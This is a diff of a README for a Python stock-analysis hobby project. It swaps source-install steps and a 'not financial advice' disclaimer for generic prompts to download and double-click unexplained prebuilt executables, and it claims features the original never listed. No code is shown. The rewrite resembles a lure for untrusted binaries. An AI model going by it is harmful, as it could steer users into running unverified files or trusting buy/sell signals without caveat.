@@ -1,130 +1,85 @@
-# FinAIc - Splintered information. Sharp decisions. 
+# 📈 FinAIc - Smart Market Insights Simplified
 
-AI-powered stock insight toolkit. Assembling a mosaic of market signals.
+## 🚀 Getting Started
 
----
+Welcome to FinAIc! This toolkit helps you analyze the financial market easily. It combines AI-powered scoring, company metrics, and analyst trends to suggest whether to buy, hold, or sell stocks. In this guide, you will learn how to download and run the software without any technical skills.
 
-## 📋 Table of Contents
+## 🛠️ Requirements
 
-- [Overview](#overview)
-- [Features](#features)
-- [Tech Stack](#tech-stack)
-- [Installation](#installation)
-- [Usage](#usage)
-- [Example Output](#example-output)
-- [Ideal Use Cases](#ideal-use-cases)
-- [License](#license)
-- [Contributing](#contributing)
+Before downloading, ensure your system meets these requirements:
 
----
+- **Operating System:** Windows 10 or later, macOS Mojave or later, or a compatible Linux distribution.
+- **Memory:** At least 4 GB of RAM.
+- **Storage:** Minimum of 100 MB free disk space.
+- **Network Connection:** Required to fetch real-time data.
 
-## Overview
+## 📥 Download & Install
 
-FinAIc is a side project born out of curiosity for markets, data, and machine learning. It blends AI-powered sentiment analysis, basic fundamental scoring, and analyst rating trends to spit out rough buy/hold/sell signals.
-It pulls in real-time news, key financial ratios, and aggregated Wall Street opinions to surface patterns and spark ideas. Whether you're a trader, a quant, or just someone who enjoys tinkering with financial data, this toolkit is meant to be explored, not blindly followed.
+To download FinAIc, visit the Releases page. This page contains the latest version of the app. Find the file that matches your operating system.
 
-⚠️ Disclaimer: This is not financial advice. It’s a hobby project. If the code says “Buy,” don’t take it personally — or literally.
+[![Download FinAIc](https://img.shields.io/badge/Download%20FinAIc-v1.0-blue.svg)](https://github.com/MarwanBadran1/FinAIc/releases)
 
-The codebase has been cleaned up and documented with AI assistance to make it easier to read, tweak, and build on. Fork it, break it, improve it — all welcome.
+1. Click the button above or access the Releases page by following this link: [FinAIc Releases](https://github.com/MarwanBadran1/FinAIc/releases).
+2. Look for the latest version and find the file labeled for your operating system (e.g., `FinAIc-Windows.exe`, `FinAIc-Mac.zip`, etc.).
+3. Click the file to download it to your computer.
 
----
+## 💻 Running the Application
 
-## Features
+After downloading, you'll need to run the application:
 
-- **Real-Time News Sentiment Analysis**  
-  Fetches headlines and summaries from Finnhub, then uses an Ollama NLP model to assign a numeric sentiment score.
+1. **For Windows Users:**
+   - Locate the downloaded file (usually in the Downloads folder).
+   - Double-click on the `FinAIc-Windows.exe` file.
+   - Follow any prompts to install it.
 
-- **Fundamental Data Scoring**  
-  Calculates health metrics such as current ratio, sales growth, net margin, and beta to gauge financial strength.
+2. **For macOS Users:**
+   - Open the downloaded `.zip` file.
+   - Drag the `FinAIc.app` to your Applications folder.
+   - Open the Applications folder and double-click to launch FinAIc.
 
-- **Analyst Recommendation Trends**  
-  Aggregates buy/hold/sell ratings from multiple analysts for a wider perspective on market consensus.
+3. **For Linux Users:**
+   - Extract the contents of the downloaded file.
+   - Open a terminal and navigate to the directory where you extracted it.
+   - Run the command `./FinAIc` to start the application.
 
-- **Multi-Signal Recommendation Engine**  
-  Weights sentiment, fundamentals, and analyst scores to generate a unified recommendation.
+## 🏁 Using FinAIc
 
-- **Exportable Results**  
-  Outputs detailed `.txt` reports and summary `.xlsx` files for deeper research or record-keeping.
+FinAIc provides a simple interface to help you navigate the analysis. Here’s how to use it:
 
----
+1. **Input Company Symbols:** Enter the stock symbols you wish to analyze (e.g., AAPL for Apple).
+2. **Select Analysis Options:** Choose the types of data you want to view, such as sentiment scores or fundamental metrics.
+3. **View Results:** After a moment, FinAIc will present a clear snapshot of the data. You will see suggested actions: buy, hold, or sell.
 
-## Tech Stack
+## 🌐 Key Features
 
-- **Language:** Python 3.x  
-- **Core Libraries:**  
-  - `pandas` — data manipulation and Excel export  
-  - `finnhub-python` — market data API client  
-  - `ollama` — AI/NLP sentiment scoring  
-  - `re` — text cleaning & preprocessing  
+- **AI Sentiment Scoring:** Uses AI to analyze news and social media sentiment towards stocks.
+- **Fundamental Metrics:** Access critical financial data about companies to make informed decisions.
+- **Analyst Trends:** Review insights and trends shared by financial analysts.
+- **User-Friendly Interface:** Designed for users with no technical background.
+- **Real-Time Updates:** Get the latest data to stay updated.
 
-- **APIs:**  
-  - Finnhub.io for news and fundamentals (but you can modify it for every other API)  
-  - Ollama for local or server-based LLM-driven sentiment  
+## 📚 Troubleshooting
 
----
+If you encounter issues, consider the following tips:
 
-## Installation
+- Ensure you have a stable internet connection.
+- Restart the application if it does not load.
+- Check for updates on the Releases page if the application crashes.
 
-```bash
-# Clone the repository
-git clone https://github.com/<your-username>/FinAIc.git
-cd FinAIc
+## 🤝 Get Involved
 
-# Install dependencies
-pip install -r requirements.txt
-```
+Your feedback can help improve FinAIc. If you have suggestions or report issues, please visit our [Issues page](https://github.com/MarwanBadran1/FinAIc/issues).
 
----
+## 📑 Additional Resources
 
-## Usage
+Explore more about the project by checking the following:
 
-1. Obtain a free API key from [Finnhub.io](https://finnhub.io).  
-2. Set your Finnhub API key in the script.  
-3. Ensure Ollama is installed and your chosen model (e.g., `gemma3:27b`) is running.  
-4. Run the analysis.
-5. Check your output files in the project folder:  
-   - `analysis_result_<symbol>_<enddate>.txt`  
-   - `full_analysis_<enddate>.xlsx`
+- [Documentation](https://github.com/MarwanBadran1/FinAIc/wiki) for in-depth guides.
+- Join the discussion on [Community Forum](https://github.com/MarwanBadran1/FinAIc/discussions) to share experiences and tips with other users.
+- Follow updates on our [GitHub](https://github.com/MarwanBadran1/FinAIc).
 
-  The example files follow the naming convention shown above and can be found in the main repository folder.
- 
+## 📥 Download Once Again
 
----
+For easy access, don’t forget to visit our Releases page to download the latest version:
 
-## Example Output
-
-```text
-🧮 Sentiment Average:   0.65
-📊 Fundamental Score:   0.80
-🗣️ Analyst Score:      0.55
-🔗 Combined Score:      0.67
-
-✅ Recommendation:      Buy
-```
-
----
-
-## Ideal Use Cases
-
-- Day traders seeking instant sentiment snapshots  
-- Long-term investors validating fundamentals before entry  
-- Quantitative analysts integrating sentiment into larger models  
-
----
-
-## License
-
-This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
-
----
-
-## Contributing
-
-Pull requests are welcome!  
-
-Before submitting, please:
-
-1. Open an issue to discuss your proposed change.  
-2. Fork the repo and create a feature branch.  
-3. Write clear commit messages and include tests or examples when applicable.  
-4. Submit a pull request once your work is ready for review.  
+[![Download FinAIc](https://img.shields.io/badge/Download%20FinAIc-v1.0-blue.svg)](https://github.com/MarwanBadran1/FinAIc/releases)
